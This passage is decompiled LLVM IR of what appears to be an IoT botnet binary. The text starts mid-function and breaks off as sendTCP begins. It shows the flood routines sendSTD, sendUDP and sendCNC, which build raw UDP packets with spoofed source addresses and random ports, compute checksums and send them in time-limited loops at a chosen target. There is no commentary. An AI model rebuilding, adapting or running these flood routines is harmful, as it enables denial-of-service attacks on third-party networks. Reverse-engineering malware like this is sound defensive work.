  %storemerge311 = phi i32 [ 0, %dec_label_pc_10009760.lr.ph ], [ %v1_100097f0, %dec_label_pc_100097ec ]
  store i32 268474212, i32* @lr, align 4
  %v0_10009760 = call i32 @__libc_fork()
  %v3_10009768 = icmp eq i32 %v0_10009760, 0
  br i1 %v3_10009768, label %dec_label_pc_100097ec, label %dec_label_pc_100097cc.preheader

dec_label_pc_100097cc.preheader:                  ; preds = %dec_label_pc_10009760
  store i32 268474324, i32* @lr, align 4
  %v1_100097d04 = call i32 @__GI_time(i32 0)
  %v2_100097dc5 = icmp slt i32 %v1_100097d04, %v2_10009690
  br i1 %v2_100097dc5, label %dec_label_pc_10009774, label %dec_label_pc_100097e4

dec_label_pc_10009774:                            ; preds = %dec_label_pc_100097cc.preheader, %dec_label_pc_100097cc.backedge
  %v3_10009788 = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  store i32 %v3_10009788, i32* %stack_var_-840, align 4
  %v3_10009798 = icmp eq i32 %v3_10009788, 0
  br i1 %v3_10009798, label %dec_label_pc_100097cc.backedge, label %dec_label_pc_100097a0

dec_label_pc_100097a0:                            ; preds = %dec_label_pc_10009774
  store i32 %v2_1000972c, i32* @r3, align 4
  %v0_100097a8 = call i32 @__GI_strlen()
  %v3_100097b4 = load i32, i32* %stack_var_-840, align 4
  store i32 268474308, i32* @lr, align 4
  %v2_100097c0 = call i32 @__libc_write(i32 %v3_100097b4, i32 %v2_1000972c)
  store i32 ptrtoint ([3 x i8]* @global_var_100097cc.868 to i32), i32* @lr, align 4
  %v1_100097c8 = call i32 @__libc_close(i32 %v3_100097b4)
  br label %dec_label_pc_100097cc.backedge

dec_label_pc_100097cc.backedge:                   ; preds = %dec_label_pc_100097a0, %dec_label_pc_10009774
  store i32 268474324, i32* @lr, align 4
  %v1_100097d0 = call i32 @__GI_time(i32 0)
  %v2_100097dc = icmp slt i32 %v1_100097d0, %v2_10009690
  br i1 %v2_100097dc, label %dec_label_pc_10009774, label %dec_label_pc_100097e4

dec_label_pc_100097e4:                            ; preds = %dec_label_pc_100097cc.backedge, %dec_label_pc_100097cc.preheader
  %v1_100097e8 = call i32 @__GI__exit(i32 1)
  br label %dec_label_pc_100097ec

dec_label_pc_100097ec:                            ; preds = %dec_label_pc_10009760, %dec_label_pc_100097e4
  %v0_1000982013 = phi i32 [ 0, %dec_label_pc_10009760 ], [ %v1_100097e8, %dec_label_pc_100097e4 ]
  %v1_100097f0 = add nuw nsw i32 %storemerge311, 1
  %v2_10009800 = icmp slt i32 %v1_100097f0, %arg6
  br i1 %v2_10009800, label %dec_label_pc_10009760, label %dec_label_pc_10009808

dec_label_pc_10009808:                            ; preds = %dec_label_pc_100097ec, %entry
  %v0_10009820 = phi i32 [ %v9_10009750, %entry ], [ %v0_1000982013, %dec_label_pc_100097ec ]
  ret i32 %v0_10009820

; uselistorder directives
  uselistorder i32 %v2_1000972c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10009690, { 1, 0 }
  uselistorder i32 268474324, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_100097ec, { 1, 0 }
  uselistorder label %dec_label_pc_10009774, { 1, 0 }
  uselistorder label %dec_label_pc_10009760, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  store i32 268474452, i32* @lr, align 4
  %v3_10009850 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 268474468, i32* @lr, align 4
  %v1_10009860 = call i32 @__GI_time(i32 0)
  store i32 268474488, i32* @lr, align 4
  %v1_10009874 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_10009880 = ptrtoint i32* %stack_var_-196 to i32
  store i32 0, i32* %stack_var_-196, align 4
  store i32 0, i32* %stack_var_-192, align 4
  %v1_100098a8 = add i32 %v1_10009874, 16
  %v2_100098a8 = inttoptr i32 %v1_100098a8 to i32*
  %v3_100098a8 = load i32, i32* %v2_100098a8, align 4
  %v1_100098ac = inttoptr i32 %v3_100098a8 to i32*
  %v2_100098ac = load i32, i32* %v1_100098ac, align 4
  %v2_100098b4 = ptrtoint i32* %stack_var_-192 to i32
  %v1_100098bc = add i32 %v1_10009874, 12
  %v2_100098bc = inttoptr i32 %v1_100098bc to i32*
  %v3_100098bc = load i32, i32* %v2_100098bc, align 4
  store i32 %v3_100098bc, i32* @r5, align 4
  store i32 268474576, i32* @lr, align 4
  %v4_100098cc = call i32 @bcopy(i32 %v2_100098ac, i32 %v2_100098b4, i32 %v3_100098bc, i32 %v1_10009874)
  %v1_100098d4 = add i32 %v1_10009874, 8
  %v2_100098d4 = inttoptr i32 %v1_100098d4 to i32*
  %v3_100098d4 = load i32, i32* %v2_100098d4, align 4
  %v1_100098d8 = urem i32 %v3_100098d4, 65536
  store i32 %v1_100098d8, i32* %stack_var_-196, align 4
  %v2_100098fc = ptrtoint i32* %stack_var_-180 to i32
  %v2_1000994c = ptrtoint i32* %stack_var_-216 to i32
  %v2_10009950 = add i32 %v2_1000994c, 36
  %v2_100099a8 = add i32 %v1_10009860, %arg3
  br label %dec_label_pc_100098f4

dec_label_pc_100098f4:                            ; preds = %dec_label_pc_100099cc, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_100099d0, %dec_label_pc_100099cc ]
  store i32 %v2_100098fc, i32* @r3, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_1001a970.905 to i32), i32* @r4, align 4
  store i32 144, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10009914.906 to i32), i32* @lr, align 4
  %v0_10009910 = call i32 @memcpy()
  store i32 268474648, i32* @lr, align 4
  %v0_10009914 = call i32 @random()
  %v1_1000992c = urem i32 %v0_10009914, 36
  %v1_10009948 = mul nuw nsw i32 %v1_1000992c, 4
  %v1_10009954 = add i32 %v2_10009950, %v1_10009948
  %v1_10009958 = inttoptr i32 %v1_10009954 to i32*
  %v2_10009958 = load i32, i32* %v1_10009958, align 4
  store i32 %v2_10009958, i32* %stack_var_-216, align 4
  %tmp23 = icmp ult i32 %storemerge3, 50
  br i1 %tmp23, label %dec_label_pc_100099cc, label %dec_label_pc_1000996c

dec_label_pc_1000996c:                            ; preds = %dec_label_pc_100098f4
  store i32 268474752, i32* @lr, align 4
  %v4_1000997c = call i32 @__libc_send(i32 %v3_10009850, i32 %v2_10009958, i32 75, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_10009994.907 to i32), i32* @lr, align 4
  %v3_10009990 = call i32 @__libc_connect(i32 %v3_10009850, i32 %v2_10009880, i32 16)
  store i32 268474780, i32* @lr, align 4
  %v1_10009998 = call i32 @__GI_time(i32 0)
  %v2_100099ac = icmp slt i32 %v1_10009998, %v2_100099a8
  br i1 %v2_100099ac, label %dec_label_pc_100099c4, label %dec_label_pc_100099b4

dec_label_pc_100099b4:                            ; preds = %dec_label_pc_1000996c
  store i32 ptrtoint ([3 x i8]* @global_var_100099bc.908 to i32), i32* @lr, align 4
  %v1_100099b8 = call i32 @__libc_close(i32 %v3_10009850)
  %v1_100099c0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100099c4

dec_label_pc_100099c4:                            ; preds = %dec_label_pc_1000996c, %dec_label_pc_100099b4
  br label %dec_label_pc_100099cc

dec_label_pc_100099cc:                            ; preds = %dec_label_pc_100098f4, %dec_label_pc_100099c4
  %stack_var_-212.0 = phi i32 [ %storemerge3, %dec_label_pc_100098f4 ], [ 0, %dec_label_pc_100099c4 ]
  %v1_100099d0 = add i32 %stack_var_-212.0, 1
  br label %dec_label_pc_100098f4

; uselistorder directives
  uselistorder i32 %v3_100098bc, { 1, 0 }
  uselistorder i32 %v1_10009874, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100099cc, { 1, 0 }
  uselistorder label %dec_label_pc_100099c4, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100099dc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100099dc, i32* %stack_var_-144, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_10009a18 = icmp eq i32 %arg2, 0
  br i1 %v3_10009a18, label %dec_label_pc_10009a20, label %dec_label_pc_10009a34

dec_label_pc_10009a20:                            ; preds = %entry
  %v0_10009a20 = call i32 @rand_cmwc()
  br label %dec_label_pc_10009a4c

dec_label_pc_10009a34:                            ; preds = %entry
  %v1_10009a38 = urem i32 %arg2, 65536
  store i32 %v1_10009a38, i32* @r3, align 4
  %v1_10009a40 = call i32 @htons(i32 %v1_10009a38)
  br label %dec_label_pc_10009a4c

dec_label_pc_10009a4c:                            ; preds = %dec_label_pc_10009a20, %dec_label_pc_10009a34
  %v2_10009a4c = ptrtoint i32* %stack_var_-96 to i32
  %v4_10009a5c = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-92, i32 %v2_10009a4c)
  %v3_10009a64 = icmp eq i32 %v4_10009a5c, 0
  br i1 %v3_10009a64, label %dec_label_pc_10009a6c, label %dec_label_pc_10009fc0

dec_label_pc_10009a6c:                            ; preds = %dec_label_pc_10009a4c
  %v3_10009a90 = icmp eq i32 %arg4, 32
  br i1 %v3_10009a90, label %dec_label_pc_10009a98, label %dec_label_pc_10009bd4

dec_label_pc_10009a98:                            ; preds = %dec_label_pc_10009a6c
  store i32 268475048, i32* @lr, align 4
  %v3_10009aa4 = call i32 @socket(i32 2, i32 2, i32 17)
  %v3_10009ab4 = icmp eq i32 %v3_10009aa4, 0
  br i1 %v3_10009ab4, label %dec_label_pc_10009abc, label %dec_label_pc_10009adc

dec_label_pc_10009abc:                            ; preds = %dec_label_pc_10009a98
  %v3_10009ac0 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 ptrtoint (i32* @global_var_10009ad8.911 to i32), i32* @lr, align 4
  %v4_10009ad4 = call i32 @HackerPrint(i32 %v3_10009ac0, i32 ptrtoint ([27 x i8]* @global_var_1001aa00.910 to i32), i32 268566528)
  br label %dec_label_pc_10009fc0

dec_label_pc_10009adc:                            ; preds = %dec_label_pc_10009a98
  %v1_10009ae0 = add i32 %arg5, 1
  store i32 268475116, i32* @lr, align 4
  %v1_10009ae8 = call i32 @malloc(i32 %v1_10009ae0)
  %v3_10009af8 = icmp eq i32 %v1_10009ae8, 0
  br i1 %v3_10009af8, label %dec_label_pc_10009fc0, label %dec_label_pc_10009b00

dec_label_pc_10009b00:                            ; preds = %dec_label_pc_10009adc
  store i32 268475168, i32* @lr, align 4
  %v3_10009b1c = call i32 @__GI_memset(i32 %v1_10009ae8, i32 0, i32 %v1_10009ae0)
  %v2_10009b28 = call i32 @makeRandomStr(i32 %v1_10009ae8, i32 %arg5)
  store i32 268475188, i32* @lr, align 4
  %v1_10009b30 = call i32 @__GI_time(i32 0)
  %v2_10009b3c = add i32 %v1_10009b30, %arg3
  br label %dec_label_pc_10009b50

dec_label_pc_10009b50:                            ; preds = %dec_label_pc_10009bc4, %dec_label_pc_10009ba0, %dec_label_pc_10009b00
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_10009b00 ], [ %v1_10009bc8, %dec_label_pc_10009bc4 ], [ 0, %dec_label_pc_10009ba0 ]
  store i32 268475252, i32* @lr, align 4
  %v6_10009b70 = call i32 @__libc_sendto(i32 %v3_10009aa4, i32 %v1_10009ae8, i32 %arg5, i32 0, i32 %v2_10009a4c, i32 16)
  %v4_10009b7c = icmp eq i32 %stack_var_-44.0, %arg6
  br i1 %v4_10009b7c, label %dec_label_pc_10009b84, label %dec_label_pc_10009bc4

dec_label_pc_10009b84:                            ; preds = %dec_label_pc_10009b50
  br i1 %v3_10009a18, label %dec_label_pc_10009b90, label %dec_label_pc_10009ba0

dec_label_pc_10009b90:                            ; preds = %dec_label_pc_10009b84
  %v0_10009b90 = call i32 @rand_cmwc()
  br label %dec_label_pc_10009ba0

dec_label_pc_10009ba0:                            ; preds = %dec_label_pc_10009b84, %dec_label_pc_10009b90
  store i32 268475304, i32* @lr, align 4
  %v1_10009ba4 = call i32 @__GI_time(i32 0)
  %v3_10009bb0 = icmp sgt i32 %v1_10009ba4, %v2_10009b3c
  br i1 %v3_10009bb0, label %dec_label_pc_10009fc0, label %dec_label_pc_10009b50

dec_label_pc_10009bc4:                            ; preds = %dec_label_pc_10009b50
  %v1_10009bc8 = add i32 %stack_var_-44.0, 1
  br label %dec_label_pc_10009b50

dec_label_pc_10009bd4:                            ; preds = %dec_label_pc_10009a6c
  store i32 268475372, i32* @lr, align 4
  %v3_10009be8 = call i32 @socket(i32 2, i32 3, i32 17)
  %v3_10009bf8 = icmp eq i32 %v3_10009be8, 0
  br i1 %v3_10009bf8, label %dec_label_pc_10009c00, label %dec_label_pc_10009c20

dec_label_pc_10009c00:                            ; preds = %dec_label_pc_10009bd4
  %v3_10009c04 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 ptrtoint (i32* @global_var_10009c1c.913 to i32), i32* @lr, align 4
  %v4_10009c18 = call i32 @HackerPrint(i32 %v3_10009c04, i32 ptrtoint ([27 x i8]* @global_var_1001aa00.910 to i32), i32 268566528)
  br label %dec_label_pc_10009fb0

dec_label_pc_10009c20:                            ; preds = %dec_label_pc_10009bd4
  store i32 1, i32* %stack_var_-80, align 4
  %v2_10009c28 = ptrtoint i32* %stack_var_-80 to i32
  store i32 268475460, i32* @lr, align 4
  %v5_10009c40 = call i32 @__GI_setsockopt(i32 %v3_10009be8, i32 0, i32 3, i32 %v2_10009c28, i32 4)
  %tmp70 = icmp sgt i32 %v5_10009c40, -1
  br i1 %tmp70, label %dec_label_pc_10009c70, label %dec_label_pc_10009c50

dec_label_pc_10009c50:                            ; preds = %dec_label_pc_10009c20
  %v3_10009c54 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 ptrtoint (i32* @global_var_10009c6c.915 to i32), i32* @lr, align 4
  %v4_10009c68 = call i32 @HackerPrint(i32 %v3_10009c54, i32 ptrtoint ([33 x i8]* @global_var_1001aa1c.914 to i32), i32 268566528)
  br label %dec_label_pc_10009fb0

dec_label_pc_10009c70:                            ; preds = %dec_label_pc_10009c20
  br label %dec_label_pc_10009c7c

dec_label_pc_10009c7c:                            ; preds = %dec_label_pc_10009c70, %dec_label_pc_10009c7c
  %v1_10009cb420 = phi i32 [ 49, %dec_label_pc_10009c70 ], [ %v1_10009cb4, %dec_label_pc_10009c7c ]
  store i32 268475524, i32* @lr, align 4
  %v1_10009c80 = call i32 @__GI_time(i32 0)
  %v0_10009c8c = call i32 @rand_cmwc()
  %v2_10009c94 = xor i32 %v1_10009c80, %v0_10009c8c
  store i32 ptrtoint (i32* @global_var_10009ca0.916 to i32), i32* @lr, align 4
  %v1_10009c9c = call i32 @srand(i32 %v2_10009c94)
  store i32 268475556, i32* @lr, align 4
  %v0_10009ca0 = call i32 @random()
  %v1_10009cac = call i32 @init_rand(i32 %v0_10009ca0)
  %v1_10009cb4 = add nsw i32 %v1_10009cb420, -1
  %v4_10009cc4 = icmp eq i32 %v1_10009cb420, 0
  br i1 %v4_10009cc4, label %dec_label_pc_10009ccc, label %dec_label_pc_10009c7c

dec_label_pc_10009ccc:                            ; preds = %dec_label_pc_10009c7c
  %v3_10009cd0 = icmp eq i32 %arg4, 0
  br i1 %v3_10009cd0, label %dec_label_pc_10009cfc, label %dec_label_pc_10009ce4

dec_label_pc_10009ce4:                            ; preds = %dec_label_pc_10009ccc
  br label %dec_label_pc_10009cfc

dec_label_pc_10009cfc:                            ; preds = %dec_label_pc_10009ccc, %dec_label_pc_10009ce4
  %v1_10009d00 = add i32 %arg5, 28
  %v1_10009d10 = add i32 %arg5, 58
  %v1_10009d14 = and i32 %v1_10009d10, -16
  %v2_10009d1c = load i32, i32* %stack_var_-144, align 4
  %v1_10009d24 = load i32, i32* @r1, align 4
  %v3_10009d24 = sub i32 %v1_10009d24, %v1_10009d14
  %v4_10009d24 = inttoptr i32 %v3_10009d24 to i32*
  store i32 %v2_10009d1c, i32* %v4_10009d24, align 4
  %v1_10009d34 = add i32 %v3_10009d24, 23
  %v1_10009d38 = and i32 %v1_10009d34, -16
  %v1_10009d58 = add i32 %v1_10009d38, 20
  %v5_10009d5c = inttoptr i32 %v1_10009d58 to i16*
  %v0_10009d6c = call i32 @HackerScan2()
  store i32 %v0_10009d6c, i32* @r3, align 4
  %v1_10009d78 = call i32 @htonl(i32 %v0_10009d6c)
  %v1_10009d84 = add i32 %arg5, 8
  %v0_10009d8c = load i32, i32* @r29, align 4
  %v6_10009d9c = inttoptr i32 %v1_10009d38 to i32*
  %v7_10009d9c = call i32 @makeIPPacket(i32* %v6_10009d9c, i32 %v0_10009d8c, i32 %v1_10009d78, i32 17, i32 %v1_10009d84, i32 %arg5)
  %v1_10009dac = urem i32 %v1_10009d84, 65536
  store i32 %v1_10009dac, i32* @r3, align 4
  %v1_10009db4 = call i32 @htons(i32 %v1_10009dac)
  %sext = mul i32 %v1_10009db4, 65536
  %v1_10009db8 = sdiv i32 %sext, 65536
  %v1_10009dc0 = trunc i32 %v1_10009db8 to i16
  %v3_10009dc0 = add i32 %v1_10009d38, 24
  %v4_10009dc0 = inttoptr i32 %v3_10009dc0 to i16*
  store i16 %v1_10009dc0, i16* %v4_10009dc0, align 8
  %v0_10009dc4 = call i32 @rand_cmwc()
  %v1_10009dd4 = trunc i32 %v0_10009dc4 to i16
  store i16 %v1_10009dd4, i16* %v5_10009d5c, align 4
  br i1 %v3_10009a18, label %dec_label_pc_10009de4, label %dec_label_pc_10009df8

dec_label_pc_10009de4:                            ; preds = %dec_label_pc_10009cfc
  %v0_10009de4 = call i32 @rand_cmwc()
  %extract.t76 = trunc i32 %v0_10009de4 to i16
  br label %dec_label_pc_10009e10

dec_label_pc_10009df8:                            ; preds = %dec_label_pc_10009cfc
  %v1_10009dfc = urem i32 %arg2, 65536
  store i32 %v1_10009dfc, i32* @r3, align 4
  %v1_10009e04 = call i32 @htons(i32 %v1_10009dfc)
  %extract.t = trunc i32 %v1_10009e04 to i16
  br label %dec_label_pc_10009e10

dec_label_pc_10009e10:                            ; preds = %dec_label_pc_10009de4, %dec_label_pc_10009df8
  %storemerge71.off0 = phi i16 [ %extract.t, %dec_label_pc_10009df8 ], [ %extract.t76, %dec_label_pc_10009de4 ]
  %v1_10009ee8.pre-phi = phi i32 [ %v1_10009dfc, %dec_label_pc_10009df8 ], [ 0, %dec_label_pc_10009de4 ]
  %v3_10009e18 = add i32 %v1_10009d38, 22
  %v4_10009e18 = inttoptr i32 %v3_10009e18 to i16*
  store i16 %storemerge71.off0, i16* %v4_10009e18, align 2
  %v3_10009e24 = add i32 %v1_10009d38, 26
  %v4_10009e24 = inttoptr i32 %v3_10009e24 to i16*
  store i16 0, i16* %v4_10009e24, align 2
  %v1_10009e2c = add i32 %v1_10009d38, 28
  %v2_10009e38 = call i32 @makeRandomStr(i32 %v1_10009e2c, i32 %arg5)
  %v1_10009e48 = or i32 %v1_10009d38, 2
  %v2_10009e48 = inttoptr i32 %v1_10009e48 to i16*
  %v3_10009e48 = load i16, i16* %v2_10009e48, align 2
  %v4_10009e48 = zext i16 %v3_10009e48 to i32
  %v5_10009e58 = inttoptr i32 %v1_10009d38 to i16*
  %v6_10009e58 = call i32 @csum(i16* %v5_10009e58, i32 %v4_10009e48, i32 %v1_10009d38, i32 17, i32 %v1_10009d84)
  %sext4 = mul i32 %v6_10009e58, 65536
  %v1_10009e5c = sdiv i32 %sext4, 65536
  %v1_10009e64 = trunc i32 %v1_10009e5c to i16
  %v3_10009e64 = or i32 %v1_10009d38, 10
  %v4_10009e64 = inttoptr i32 %v3_10009e64 to i16*
  store i16 %v1_10009e64, i16* %v4_10009e64, align 2
  store i32 268476016, i32* @lr, align 4
  %v1_10009e6c = call i32 @__GI_time(i32 0)
  %v2_10009e78 = add i32 %v1_10009e6c, %arg3
  %v3_10009f18 = or i32 %v1_10009d38, 4
  %v4_10009f18 = inttoptr i32 %v3_10009f18 to i16*
  %v2_10009f3c = or i32 %v1_10009d38, 12
  %v3_10009f3c = inttoptr i32 %v2_10009f3c to i32*
  br label %dec_label_pc_10009e8c

dec_label_pc_10009e8c:                            ; preds = %dec_label_pc_10009e8c.backedge, %dec_label_pc_10009e10
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_10009e10 ], [ %storemerge24, %dec_label_pc_10009e8c.backedge ]
  store i32 268476080, i32* @lr, align 4
  %v6_10009eac = call i32 @__libc_sendto(i32 %v3_10009be8, i32 %v1_10009d38, i32 %v1_10009d00, i32 0, i32 %v2_10009a4c, i32 16)
  %v0_10009eb0 = call i32 @rand_cmwc()
  %v1_10009ec0 = trunc i32 %v0_10009eb0 to i16
  store i16 %v1_10009ec0, i16* %v5_10009d5c, align 4
  br i1 %v3_10009a18, label %dec_label_pc_10009ed0, label %dec_label_pc_10009ee4

dec_label_pc_10009ed0:                            ; preds = %dec_label_pc_10009e8c
  %v0_10009ed0 = call i32 @rand_cmwc()
  %extract.t78 = trunc i32 %v0_10009ed0 to i16
  br label %dec_label_pc_10009efc

dec_label_pc_10009ee4:                            ; preds = %dec_label_pc_10009e8c
  store i32 %v1_10009ee8.pre-phi, i32* @r3, align 4
  %v1_10009ef0 = call i32 @htons(i32 %v1_10009ee8.pre-phi)
  %extract.t77 = trunc i32 %v1_10009ef0 to i16
  br label %dec_label_pc_10009efc

dec_label_pc_10009efc:                            ; preds = %dec_label_pc_10009ed0, %dec_label_pc_10009ee4
  %storemerge73.off0 = phi i16 [ %extract.t77, %dec_label_pc_10009ee4 ], [ %extract.t78, %dec_label_pc_10009ed0 ]
  store i16 %storemerge73.off0, i16* %v4_10009e18, align 2
  %v0_10009f08 = call i32 @rand_cmwc()
  %v1_10009f18 = trunc i32 %v0_10009f08 to i16
  store i16 %v1_10009f18, i16* %v4_10009f18, align 4
  %v0_10009f24 = call i32 @HackerScan2()
  store i32 %v0_10009f24, i32* @r3, align 4
  %v1_10009f30 = call i32 @htonl(i32 %v0_10009f24)
  store i32 %v1_10009f30, i32* %v3_10009f3c, align 4
  %v3_10009f4c = load i16, i16* %v2_10009e48, align 2
  %v4_10009f4c = zext i16 %v3_10009f4c to i32
  %v6_10009f5c = call i32 @csum(i16* %v5_10009e58, i32 %v4_10009f4c, i32 %v1_10009d38, i32 0, i32 %v2_10009a4c)
  %v1_10009f68 = trunc i32 %v6_10009f5c to i16
  store i16 %v1_10009f68, i16* %v4_10009e64, align 2
  %v4_10009f74 = icmp eq i32 %stack_var_-48.0, %arg6
  br i1 %v4_10009f74, label %dec_label_pc_10009f7c, label %dec_label_pc_10009fa0

dec_label_pc_10009f7c:                            ; preds = %dec_label_pc_10009efc
  store i32 268476292, i32* @lr, align 4
  %v1_10009f80 = call i32 @__GI_time(i32 0)
  %v3_10009f8c = icmp sgt i32 %v1_10009f80, %v2_10009e78
  br i1 %v3_10009f8c, label %dec_label_pc_10009fb0, label %dec_label_pc_10009e8c.backedge

dec_label_pc_10009e8c.backedge:                   ; preds = %dec_label_pc_10009f7c, %dec_label_pc_10009fa0
  %storemerge24 = phi i32 [ %v1_10009fa4, %dec_label_pc_10009fa0 ], [ 0, %dec_label_pc_10009f7c ]
  br label %dec_label_pc_10009e8c

dec_label_pc_10009fa0:                            ; preds = %dec_label_pc_10009efc
  %v1_10009fa4 = add i32 %stack_var_-48.0, 1
  br label %dec_label_pc_10009e8c.backedge

dec_label_pc_10009fb0:                            ; preds = %dec_label_pc_10009f7c, %dec_label_pc_10009c50, %dec_label_pc_10009c00
  %v0_10009fd828 = phi i32 [ %v4_10009c68, %dec_label_pc_10009c50 ], [ %v4_10009c18, %dec_label_pc_10009c00 ], [ %v1_10009f80, %dec_label_pc_10009f7c ]
  br label %dec_label_pc_10009fc0

dec_label_pc_10009fc0:                            ; preds = %dec_label_pc_10009ba0, %dec_label_pc_10009a4c, %dec_label_pc_10009adc, %dec_label_pc_10009abc, %dec_label_pc_10009fb0
  %v0_10009fd8 = phi i32 [ %v4_10009a5c, %dec_label_pc_10009a4c ], [ 0, %dec_label_pc_10009adc ], [ %v4_10009ad4, %dec_label_pc_10009abc ], [ %v0_10009fd828, %dec_label_pc_10009fb0 ], [ %v1_10009ba4, %dec_label_pc_10009ba0 ]
  ret i32 %v0_10009fd8

; uselistorder directives
  uselistorder i32 %v1_10009ee8.pre-phi, { 1, 0 }
  uselistorder i32 %v1_10009dfc, { 2, 1, 0 }
  uselistorder i32 %v1_10009dac, { 1, 0 }
  uselistorder i32 %v1_10009d84, { 2, 0, 1 }
  uselistorder i32 %v1_10009d38, { 9, 10, 1, 2, 3, 11, 0, 4, 5, 6, 7, 8, 12, 13 }
  uselistorder i32 %v2_10009a4c, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10009a38, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 0 }
  uselistorder i32 %arg5, { 1, 3, 2, 5, 4, 0, 6, 7 }
  uselistorder label %dec_label_pc_10009fc0, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10009e8c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10009efc, { 1, 0 }
  uselistorder label %dec_label_pc_10009e10, { 1, 0 }
  uselistorder label %dec_label_pc_10009cfc, { 1, 0 }
  uselistorder label %dec_label_pc_10009c7c, { 1, 0 }
  uselistorder label %dec_label_pc_10009ba0, { 1, 0 }
  uselistorder label %dec_label_pc_10009a4c, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  store i32 268476420, i32* @lr, align 4
  %v1_1000a000 = call i32 @__GI_time(i32 0)
  %v2_1000a00c = add i32 %v1_1000a000, %arg3
  store i32 268476448, i32* @lr, align 4
  %v1_1000a01c = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-48, align 4
  %v1_1000a034 = urem i32 %arg2, 65536
  store i32 %v1_1000a034, i32* @r3, align 4
  %v1_1000a03c = call i32 @htons(i32 %v1_1000a034)
  store i32 268476560, i32* @lr, align 4
  %v1_1000a08c1 = call i32 @__GI_time(i32 0)
  %v2_1000a0982 = icmp slt i32 %v1_1000a08c1, %v2_1000a00c
  br i1 %v2_1000a0982, label %dec_label_pc_1000a04c.lr.ph, label %dec_label_pc_1000a0a0

dec_label_pc_1000a04c.lr.ph:                      ; preds = %entry
  %v2_1000a064 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_1000a04c

dec_label_pc_1000a04c:                            ; preds = %dec_label_pc_1000a04c.lr.ph, %dec_label_pc_1000a04c
  store i32 268476508, i32* @lr, align 4
  %v3_1000a058 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_1000a078.917 to i32), i32* @lr, align 4
  %v3_1000a074 = call i32 @__libc_connect(i32 %v3_1000a058, i32 %v2_1000a064, i32 16)
  store i32 268476544, i32* @lr, align 4
  %v1_1000a07c = call i32 @sleep(i32 1)
  store i32 ptrtoint ([3 x i8]* @global_var_1000a088.918 to i32), i32* @lr, align 4
  %v1_1000a084 = call i32 @__libc_close(i32 %v3_1000a058)
  store i32 268476560, i32* @lr, align 4
  %v1_1000a08c = call i32 @__GI_time(i32 0)
  %v2_1000a098 = icmp slt i32 %v1_1000a08c, %v2_1000a00c
  br i1 %v2_1000a098, label %dec_label_pc_1000a04c, label %dec_label_pc_1000a0a0

dec_label_pc_1000a0a0:                            ; preds = %dec_label_pc_1000a04c, %entry
  %v1_1000a08c.lcssa = phi i32 [ %v1_1000a08c1, %entry ], [ %v1_1000a08c, %dec_label_pc_1000a04c ]
  ret i32 %v1_1000a08c.lcssa

; uselistorder directives
  uselistorder i32 %v1_1000a034, { 1, 0 }
  uselistorder i32 %v2_1000a00c, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 268476560, { 1, 0 }
  uselistorder label %dec_label_pc_1000a04c, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000a0b8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000a0b8, i32* %stack_var_-128, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_1000a108 = icmp eq i32 %arg2, 0
  br i1 %v3_1000a108, label %dec_label_pc_1000a110, label %dec_label_pc_1000a124

dec_label_pc_1000a110:                            ; preds = %entry
  %v0_1000a110 = call i32 @rand_cmwc()
  br label %dec_label_pc_1000a13c

dec_label_pc_1000a124:                            ; preds = %entry
  %v1_1000a128 = urem i32 %arg2, 65536
  store i32 %v1_1000a128, i32* @r3, align 4
  %v1_1000a130 = call i32 @htons(i32 %v1_1000a128)
  br label %dec_label_pc_1000a13c

